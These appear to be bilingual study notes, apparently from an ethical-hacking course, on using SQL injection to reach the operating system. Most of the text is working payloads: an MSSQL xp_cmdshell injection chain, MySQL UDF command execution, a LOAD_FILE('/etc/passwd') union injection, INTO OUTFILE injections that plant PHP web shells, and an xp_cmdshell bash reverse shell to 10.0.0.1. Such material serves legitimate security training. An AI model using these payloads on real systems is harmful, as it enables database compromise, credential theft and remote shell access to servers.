**There are two different ways to interact with an OS:**

**▪ Reading and writing system files from the disk:** Un atacante puede leer archivos arbitrarios presentes en el sistema objetivo que ejecuta el DBMS y robar documentos importantes, configuraciones o archivos binarios. También puede obtener credenciales desde los archivos del sistema objetivo para lanzar ataques adicionales al sistema

**▪ Direct command execution via remote shell:** Un atacante puede abusar de un token de acceso de Windows para escalar sus privilegios en el sistema objetivo, realizar actividades maliciosas y lanzar ataques adicionales.

For example, the following queries can be used to interact with the target operating system:

▪ MSSQL OS Interaction

'; exec master..==**xp_cmdshell**== 'ipconfig > test.txt' --'; CREATE TABLE tmp (txt varchar(8000)); BULK INSERT tmp FROM 'test.txt' --'; begin declare @data varchar(8000) ; set @data='| ' ; select @data=@data+txt+' | ' from tmp where txt<@data ; select @data as x into temp end --' and 1 in (select substring(x,1,256) from temp) --'; declare @var sysname; set @var = 'del test.txt'; EXEC master..xp_cmdshell @var; drop table temp; drop table tmp --

▪ MySQL OS Interaction CREATE FUNCTION ==**sys_exec**== RETURNS int SONAME 'libudffmwgj.dll'; CREATE FUNCTION sys_eval RETURNS string SONAME 'libudffmwgj.dll';

**Nota: Estos métodos están restringidos por los privilegios y permisos con los que se ejecuta la base de datos.**

**Interacting with the File System**

Los atacantes explotan la funcionalidad de MySQL que permite leer archivos de texto a través de la base de datos para obtener archivos de contraseñas y almacenar los resultados de una consulta en un archivo de texto.

==**▪ LOAD_FILE()**== 

La función LOAD_FILE() en MySQL se utiliza para leer y devolver el contenido de un archivo ubicado dentro del servidor MySQL.  
Por ejemplo, la siguiente consulta es utilizada por un atacante para recuperar el archivo de contraseñas desde la base de datos:

**NULL UNION ALL SELECT LOAD_FILE('/etc/passwd')/***

Si la inyección tiene éxito, mostrará el contenido del archivo passwd.

==**▪ INTO OUTFILE()**==

La función INTO OUTFILE() en MySQL ==se utiliza comúnmente para ejecutar una consulta y volcar los resultados en un archivo.==  
Por ejemplo, la siguiente consulta es usada por un atacante para almacenar los resultados de una consulta específica:

**NULL UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system($_GET["command"]); ?>' INTO OUTFILE '/var/www/certifiedhacker.com/shell.php'/***

Si tiene éxito, será posible ejecutar comandos del sistema a través de la variable global $_GET.

The following is an example of using wget to get a file:

http://www.certifiedhacker.com/shell.php?command=wget

**▪ Getting OS Shell**

Using Outfile SELECT '<?php exec($_GET[''cmd'']); ?>' FROM usertable INTO dumpfile ‘/var/www/html/shell.php’

**▪ Finding Directory Structure**

SELECT @@datadir;

**▪** **Using Built-in DBMS Functions**

EXEC ==xp_cmdshell== 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'

